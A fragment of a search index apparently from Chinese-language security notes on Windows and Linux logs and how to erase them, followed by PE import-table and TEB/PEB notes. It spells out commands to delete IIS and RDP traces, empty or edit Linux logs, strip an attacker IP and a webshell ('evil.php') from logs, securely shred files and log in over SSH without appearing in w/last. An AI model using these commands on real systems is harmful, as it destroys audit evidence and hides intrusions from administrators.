\u5220\u9664\u65e5\u5fd7\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\uff1adel *.* \u542f\u7528\u670d\u52a1\uff1anet start w3svc","title":"IIS"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_10","text":"%systemroot%\\system32\\config\\AppEvent.EVT; %systemroot%\\system32\\config\\SecEvent.EVT; %systemroot%\\system32\\config\\SysEvent.EVT;","title":"\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\uff0c\u5b89\u5168\u65e5\u5fd7\uff0c\u7cfb\u7edf\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#ftp","text":"%systemroot%\\system32\\logfiles\\msftpsvc1\\","title":"ftp"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_11","text":"\u76f4\u63a5\u5ad6\u811a\u672c @echo off reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f # \u5220\u9664Default\u4e2d\u7684\u6240\u6709\u503c reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f # \u5220\u9664\u6574\u4e2aServers reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" \u91cd\u65b0\u521b\u5efa\u5220\u9664\u7684\u6ce8\u518c\u8868\u9879 cd %userprofile%\\documents\\ # \u8f6c\u5230Default.rdp\u6587\u4ef6\u76ee\u5f55 attrib Default.rdp -s -h # \u66f4\u6539Default.rdp\u6587\u4ef6\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b83\u662f\u9690\u85cf del Default.rdp # \u5220\u9664\u6587\u4ef6Default.rdp\u6587\u4ef6","title":"\u8fdc\u7a0b\u684c\u9762"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_12","text":"\u5982\u4f55\u5f7b\u5e95\u5220\u9664\u65e5\u5fd7\uff1f\u8981\u77e5\u9053\u4ec5\u4ec5\u662f\u666e\u901a\u7684\u5220\u9664\u547d\u4ee4\u5b9e\u9645\u4e0a\u662f\u5e76\u4e0d\u80fd\u505a\u5230\u5b8c\u5168\u5220\u9664\u7684\uff0c\u5f88\u5bb9\u6613\u88ab\u627e\u5230\u5220\u9664\u6587\u4ef6\u3002","title":"\u5f7b\u5e95\u5220\u9664\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#cipher","text":"\u5728\u5220\u9664\u6587\u4ef6\u540e\uff0c\u53ef\u4ee5\u5229\u7528Cipher \u547d\u4ee4\u901a\u8fc7 /W \u53c2\u6570\u53ef\u53cd\u590d\u5199\u5165\u5176\u4ed6\u6570\u636e\u8986\u76d6\u5df2\u5220\u9664\u6587\u4ef6\u7684\u786c\u76d8\u7a7a\u95f4\uff0c\u5f7b\u5e95\u5220\u9664\u6570\u636e\u9632\u6b62\u88ab\u6062\u590d\u3002\u6bd4\u5982 \u521a\u521a\u5220\u9664 D:\\tools \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u6267\u884c cipher /w:D:\\tools \uff0cD \u76d8\u4e0a\u672a\u4f7f\u7528\u7a7a\u95f4\u5c31\u4f1a\u88ab\u8986\u76d6\u4e09\u6b21\uff1a\u4e00\u6b21 0x00\u3001\u4e00\u6b21 0xFF\uff0c\u4e00\u6b21\u968f\u673a\u6570\uff0c\u6240\u6709\u88ab\u5220\u9664\u7684\u6587\u4ef6\u5c31\u90fd\u4e0d\u53ef\u80fd\u88ab\u6062\u590d\u4e86\u3002","title":"Cipher \u547d\u4ee4\u591a\u6b21\u8986\u5199"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#format","text":"Format \u547d\u4ee4\u52a0\u4e0a /P \u53c2\u6570\u540e\uff0c\u5c31\u4f1a\u628a\u6bcf\u4e2a\u6247\u533a\u5148\u6e05\u96f6\uff0c\u518d\u7528\u968f\u673a\u6570\u8986\u76d6\u3002\u800c\u4e14\u53ef\u4ee5\u8986\u76d6\u591a\u6b21\u3002\u6bd4\u5982 format D: /P:8 \u5c31\u8868\u793a\u628a D \u76d8\u7528\u968f\u673a\u6570\u8986\u76d6 8 \u6b21\u3002","title":"Format\u547d\u4ee4\u8986\u76d6\u683c\u5f0f\u5316"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#linux","text":"/var/log/message \u7cfb\u7edf\u542f\u52a8\u540e\u7684\u4fe1\u606f\u548c\u9519\u8bef\u65e5\u5fd7\uff0c\u662fRed Hat Linux\u4e2d\u6700\u5e38\u7528\u7684\u65e5\u5fd7\u4e4b\u4e00 /var/log/secure \u4e0e\u5b89\u5168\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/maillog \u4e0e\u90ae\u4ef6\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/cron \u4e0e\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/spooler \u4e0eUUCP\u548cnews\u8bbe\u5907\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/boot.log \u5b88\u62a4\u8fdb\u7a0b\u542f\u52a8\u548c\u505c\u6b62\u76f8\u5173\u7684\u65e5\u5fd7\u6d88\u606f /var/log/wtmp \u8be5\u65e5\u5fd7\u6587\u4ef6\u6c38\u4e45\u8bb0\u5f55\u6bcf\u4e2a\u7528\u6237\u767b\u5f55\u3001\u6ce8\u9500\u53ca\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u505c\u673a\u7684\u4e8b\u4ef6,\u7528last\u67e5\u770b /var/log/btmp \u8bb0\u5f55\u6240\u6709\u767b\u5f55\u5931\u8d25\u4fe1\u606f\uff0c\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u67e5\u770b ~/.bash_history \u6267\u884c\u7684\u547d\u4ee4,\u7528 histroy -c \u5373\u53ef\u5220\u9664","title":"LINUX \u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_13","text":"\u6e05\u9664\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\uff1aecho > /var/log/lastlog #lastlog\u547d\u4ee4 \u6e05\u9664\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\uff1aecho > /var/log/utmp #\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4 \u6e05\u9664\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\uff1acat /dev/null > /var/log/secure \u6e05\u9664\u7cfb\u7edf\u65e5\u5fd7\u8bb0\u5f55\uff1acat /dev/null > /var/log/message \u8bf8\u5982\u6b64\u7c7b...","title":"\u6e05\u7a7a\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_14","text":"\u65e5\u5fd7\u6587\u4ef6\u88ab\u6e05\u7a7a\u4f1a\u5f15\u8d77\u7ba1\u7406\u5458\u8b66\u89c9\uff0c\u6240\u4ee5\u53ef\u4ee5\u53ea\u66ff\u6362\u6216\u5220\u9664\u5173\u952e\u4fe1\u606f\uff0c\u5b9e\u73b0\u9690\u79d8\u653b\u51fb\u7684\u76ee\u7684\u3002 # \u5220\u9664\u6240\u6709\u5339\u914d\u5230\u5b57\u7b26\u4e32\u7684\u884c,\u6bd4\u5982\u4ee5\u5f53\u5929\u65e5\u671f\u6216\u8005\u81ea\u5df1\u7684\u767b\u5f55ip sed -i '/\u81ea\u5df1\u7684ip/'d /var/log/messages # \u5168\u5c40\u66ff\u6362\u767b\u5f55IP\u5730\u5740\uff1a sed -i 's/192.168.166.85/192.168.1.1/g' secure \u5bf9\u4e8eWEB\u670d\u52a1\u8fd8\u53ef\u4ee5\u8fd9\u6837\u9690\u85cf\u6211\u4eec\u7684\u9a6c # \u4f7f\u7528grep -v\u6765\u628a\u6211\u4eec\u7684\u76f8\u5173\u4fe1\u606f\u5220\u9664, cat /var/log/nginx/access.log | grep -v evil.php > tmp.log # \u628a\u4fee\u6539\u8fc7\u7684\u65e5\u5fd7\u8986\u76d6\u5230\u539f\u65e5\u5fd7\u6587\u4ef6 cat tmp.log > /var/log/nginx/access.log/","title":"\u66ff\u6362/\u5220\u9664\u90e8\u5206\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_15","text":"","title":"\u5f7b\u5e95\u5220\u9664"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#shred","text":"-n \u6307\u5b9a\u8986\u5199\u6b21\u6570\uff0c\u9ed8\u8ba43\u6b21 shred -f -u -z -v -n 8 1.txt","title":"shred"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#dd","text":"\u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u6e05\u7a7a\u6587\u4ef6 dd if=/dev/zero of=\u8981\u5220\u9664\u7684\u6587\u4ef6","title":"dd"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#wipe","text":"\u5f88\u7b80\u5355\u6613\u7528\uff0c\u4f46\u662f\u4e00\u822c\u4e0d\u662f\u88c5\u673a\u81ea\u5e26 wipe filename","title":"wipe"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#secure-delete","text":"secure-delete\u662f\u4e00\u4e2a\u96c6\u6210\u5316\u5de5\u5177\u5305\uff0c\u6536\u5f55\u4e86\u4e9b\u5b89\u5168\u5220\u9664\u6587\u4ef6\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002 srm filename sfill /a \u7528\u968f\u673a\u6570\u586b\u5145\u7a7a\u95f2\u6216\u8005\u53ef\u7528\u7684\u7a7a\u95f4\uff0c\u4fdd\u8bc1\u6ca1\u6709\u53ef\u6062\u590d\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939 sswap\u7528\u4e8e\u5b89\u5168\u5730\u6e05\u9664\u4ea4\u6362\u5206\u533a\u3002 cat /proc/swaps \u627e\u5230\u4ea4\u6362\u5206\u533a sswap /www/swap smem\u7528\u4e8e\u6e05\u7406\u5728\u5185\u5b58\u4e2d\u7684\u5185\u5bb9\uff0c\u63d0\u4f9b\u5b89\u5168\u5730\u5185\u5b58\u6e05\u7406: smem","title":"Secure-Delete"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#ssh","text":"ssh -T root@192.168.199.123 /usr/bin/bash -i -T\u8868\u793a\u4e0d\u5206\u914d\u4f2a\u7ec8\u7aef\uff0c/usr/bin/bash -i \u8868\u793a\u5728\u767b\u5f55\u540e\u8c03\u7528bash\u547d\u4ee4 -i \u8868\u793a\u662f\u4ea4\u4e92\u5f0fshel\uff0c\u8fd9\u6837\u767b\u9646\u5c06\u4e0d\u4f1a\u5728w/last\u547d\u4ee4\u7ed3\u679c\u4e2d\u663e\u793a. \u4f46\u662f\u4f1a\u88ablsof -i:22 \u548c ps |grep ssh \u7b49\u547d\u4ee4\u53d1\u73b0","title":"SSH\u9690\u8eab\u767b\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84RPC%E5%85%A5%E9%97%A8/%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84RPC%E5%85%A5%E9%97%A8/","text":"\u5b89\u5168\u89c6\u89d2\u4e0b\u7684RPC\u5165\u95e8","title":"\u5b89\u5168\u89c6\u89d2\u4e0b\u7684RPC\u5165\u95e8"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84RPC%E5%85%A5%E9%97%A8/%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84RPC%E5%85%A5%E9%97%A8/#rpc","text":"","title":"\u5b89\u5168\u89c6\u89d2\u4e0b\u7684RPC\u5165\u95e8"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/","text":"\u6742\u8bb0 \u76ee\u5f55 \u7ed3\u6784\u4f53\u4e0e\u5171\u7528\u4f53 PE\u6587\u4ef6\u4e4b\u5bfc\u5165\u8868 c++\u4e2d\u51e0\u4e2a\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u533a\u522b VirtualAlloc HeapAlloc malloc new TEB PEB \u901a\u8fc7TEB\\&PEB \u52a8\u6001\u83b7\u53d6\u51fd\u6570\u5730\u5740 \u521b\u5efa\u670d\u52a1 \u670d\u52a1 \u5982\u4f55\u521b\u5efa\u4e00\u4e2aWindows\u670d\u52a1 \u670d\u52a1\u7a0b\u5e8f\u4e3b\u51fd\u6570 \u5b8c\u6210\u670d\u52a1\u7a0b\u5e8f\u5185\u5bb9\u4e3b\u51fd\u6570 \u521b\u5efa\u670d\u52a1\u5185\u5bb9\u4e3b\u51fd\u6570 \u5b9e\u73b0 SERVICE_STATUS \u7ed3\u6784 \u5b9e\u73b0\u670d\u52a1\u53e5\u67c4&\u6539\u53d8\u72b6\u6001\u4fe1\u606f DEMO \u542f\u7528SeDebugPrivilege Token PRIVILEGES\u7ed3\u6784\u6811 dll\u7f16\u5199 DLLMAIN DLL \u5bfc\u51fa\u51fd\u6570 \u9898\u5916\u8bdd\uff1a\u600e\u4e48\u4f7f\u7528dll\u6216lib\u4e2d\u7684\u5bfc\u51fa\u51fd\u6570 \u9759\u6001\u94fe\u63a5 \u52a8\u6001\u94fe\u63a5 rundll32 \u6d88\u606f\u673a\u5236 \u4e8b\u4ef6\u9a71\u52a8 \u6d88\u606f\u673a\u5236 \u7ed3\u6784\u4f53\u4e0e\u5171\u7528\u4f53 PE\u6587\u4ef6\u4e4b\u5bfc\u5165\u8868 \u5bfc\u5165\u8868\u4f5c\u4e3aPE\u6587\u4ef6\u4e2d\u91cd\u8981\u7684\u4e00\u73af\uff0c\u5728\u514d\u6740\u4e2d\u6709\u8bf8\u591a\u5229\u7528\u3002 \u4e00\u4e2a\u5bfc\u5165\u8868\u7684\u7ed3\u6784\u5982\u4e0b \u4e0b\u9762\u53ea\u8bf4\u8bf4\u91cd\u8981\u7684\u9879 OriginalFirstThunk \u6307\u5411\u5bfc\u5165\u540d\u79f0\u8868INT\u7684RVA. Name \u5b58\u50a8\u51fd\u6570\u540d\u5b57\u7684RVA\u3002 FirstThunk \u6307\u5411\u5bfc\u5165\u5730\u5740\u8868IAT\u7684RVA\u3002 OriginalFirstThunk \u548cFirstThunk\u5bf9\u5e94\u7684INT\u548cIAT\u662f\u4e2a\u4ec0\u4e48\u6837\u7684\u6982\u5ff5\u5462\uff1f \u9996\u5148\uff0c\u65e0\u8bba\u662fINT\u8fd8\u662fIAT\uff0c\u5728PE\u6587\u4ef6\u88ab\u52a0\u8f7d\u524d\uff08\u5373\u5728\u6587\u4ef6\u5f62\u5f0f\u65f6\uff09\u90fd\u6307\u5411\u540c\u4e00\u79cd\u7ed3\u6784\uff1aIMAGE_THUNK_DATA,\u5176\u7ed3\u6784\u5982\u4e0b typedef struct _IMAGE_THUNK_DATA32 { union { DWORD ForwarderString; // PBYTE \u6307\u5411\u4e00\u4e2a\u8f6c\u5411\u8005\u5b57\u7b26\u4e32\u7684RVA DWORD Function; // PDWORD \u88ab\u8f93\u5165\u7684\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740 DWORD Ordinal; // \u88ab\u8f93\u5165\u7684 API \u7684\u5e8f\u6570\u503c DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME \u6307\u5411 IMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA32; typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; \u662f\u4e00\u4e2a\u8054\u5408\u4f53\u7ed3\u6784(\u6240\u4ee5\u53ea\u5360\u56db\u4e2a\u5b57\u8282)\uff0c \u5f53\u6700\u9ad8\u4f4d\u4e3a0\u65f6\uff0c\u5c31\u8bf4\u660e\u8fd9\u56db\u5b57\u8282\u503c\u4e3a IMAGE_IMPORT_BY_NAME \u7684RVA \u5f53\u6700\u9ad8\u4f4d\u4e3a1\u65f6\uff0c\u5219\u53bb\u6389\u6700\u9ad8\u4f4d\u540e\u5269\u4e0b31\u4f4d\u5219\u4e3adll\u51fd\u6570\u5728\u5bfc\u51fa\u8868\u4e2d\u7684\u5bfc\u51fa\u5e8f\u53f7 \u6211\u4eec\u901a\u5e38\u53d6\u5176AddressOfData\u503c\u6765\u83b7\u5f97\u53e6\u4e00\u4e2a\u7ed3\u6784IMAGE_IMPORT_BY_NAME. ypedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; //\u53ef\u80fd\u4e3a0\uff0c\u7f16\u8bd1\u5668\u51b3\u5b9a\uff0c\u5982\u679c\u4e0d\u4e3a0\uff0c\u662f\u51fd\u6570\u5728\u5bfc\u51fa\u8868\u4e2d\u7684\u7d22\u5f15 BYTE Name[1]; //\u51fd\u6570\u540d\u79f0\uff0c\u4ee50\u7ed3\u5c3e\uff0c\u7531\u4e8e\u4e0d\u77e5\u9053\u5230\u5e95\u591a\u957f\uff0c\u6240\u4ee5\u5e72\u8106\u53ea\u7ed9\u51fa\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u627e\u52300\u7ed3\u675f } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; \u4ee5\u4e0a\u5219\u662f\u57fa\u672c\u7684\u7ed3\u6784\uff0c\u4e0b\u9762\u5206\u6790\u5176\u5de5\u4f5c\u7684\u65f6\u5019\u7684\u5b9e\u73b0\u6d41\u7a0b\u3002 \u9996\u5148\u5728\u52a0\u8f7d\u524d\uff0cIAT\u548cINT\u662f\u6307\u5411\u540c\u4e00\u4e2a\u7ed3\u6784IMAGE_THUNK_DATA,\u7684 \u800c\u52a0\u8f7d\u540e\uff0cWindows\u4f1a\u91cd\u5199FirstThunk\u6240\u6307\u5411\u7684INT\u4e2d\u7684\u6bcf\u4e00\u4e2aIMAGE_THUNK_DATA32\uff0c\u4f7f\u5176\u76f4\u63a5\u6307\u5411\u51fd\u6570\u5730\u5740\uff0c\u8fd9\u4e5f\u5c31\u662fIAT\u8f93\u5165\u5730\u5740\u8868\u7684\u540d\u5b57\u7531\u6765\u3002 c++\u4e2d\u51e0\u4e2a\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u533a\u522b VirtualAlloc \u7528\u6765\u5206\u914d\u5927\u5757\u5185\u5b58\u3002\u4f7f\u7528VirtualFree\u6765\u91ca\u653e HeapAlloc \u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u4f1a\u5728\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u521b\u5efa1M\u5927\u5c0f\u7684\u5806\uff0c\u53eb\u505a\u9ed8\u8ba4\u5806\u3002HeapAlloc\u7528\u4e8e\u4ece\u5806\u4e0a\u5206\u914d\u5185\u5b58\u5757\u3002 \u5806\u7684\u4f7f\u7528\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u8fdb\u884c\u5185\u5b58\u7ba1\u7406,\u907f\u514d\u7ebf\u7a0b\u540c\u6b65\u7684\u5f00\u9500\u4ee5\u53ca\u5feb\u901f\u91ca\u653e\u5185\u5b58\u3002 \u6b64\u51fd\u6570\u4e00\u822c\u7528\u4e8e\u5206\u914d\u4e00\u822c\u5927\u5c0f\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5f53\u5206\u914d\u5185\u5b58\u5757\u5927\u4e8e1M\u6700\u597d\u907f\u514d\u4f7f\u7528\u6b64\u51fd\u6570\u3002 \u4f7f\u7528HeapFree\u91ca\u653e malloc C\u5206\u914d\u5185\u5b58\u7684\u65b9\u5f0f\uff0c\u5982\u679c\u60a8\u4f7f\u7528C\u800c\u4e0d\u662fC ++\u7f16\u5199\u4ee3\u7801\uff0c\u5e76\u4e14\u60a8\u5e0c\u671b\u60a8\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u5728Unix\u8ba1\u7b97\u673a\u4e0a\u5de5\u4f5c\uff0c\u6216\u8005\u6709\u4eba\u660e\u786e\u8868\u793a\u9700\u8981\u4f7f\u7528\u5b83\uff0c\u90a3\u4e48\u8bf7\u9009\u62e9\u6b64\u9009\u9879\u3002\u7528free\u89e3\u9664\u5206\u914d\u3002 \u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0cvisual c++\u7684malloc\u8c03\u7528\u4e86HeapAlloc new c++\u5206\u914d\u5185\u5b58\u7684\u65b9\u5f0f\u3002\u7528delete\u89e3\u9664\u5206\u914d\u3002 TEB PEB TEB,\u5373\u7ebf\u7a0b\u73af\u5883\u5757\u3002\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u5177\u6709\u4e00\u4e2aTEB\u7ed3\u6784\uff0c\u8bb0\u5f55\u4e86\u76f8\u5173\u7ebf\u7a0b\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f\u3002 \u7ebf\u7a0b\u8fd0\u884c\u65f6\uff0cFS\u6bb5\u5bc4\u5b58\u5668\u8bb0\u5f55\u4e86\u5176TEB\u7684\u4f4d\u7f6e\uff0cTEB\u7ed3\u6784\u76840x30\u5904\u504f\u79fb\u5373\u4e3aPEB\u8fdb\u7a0b\u73af\u5883\u5feb\u3002 mov eax,fs:[0x30] PEB\u7ed3\u6784\u5f88\u5927\uff0c\u67090x210\u4e2a\u5b57\u8282\u3002 \u901a\u8fc7TEB\\&PEB \u52a8\u6001\u83b7\u53d6\u51fd\u6570\u5730\u5740 \u5728PEB\u7ed3\u6784\u76840x0c\u504f\u79fb\u5904\uff0c\u662f\u4e00\u4e2a\u6307\u5411PEB_LDR_DATA\u7ed3\u6784\u7684\u6307\u9488\u3002\u8fd9\u4e2a\u7ed3\u6784\u5982\u4e0b\uff1a 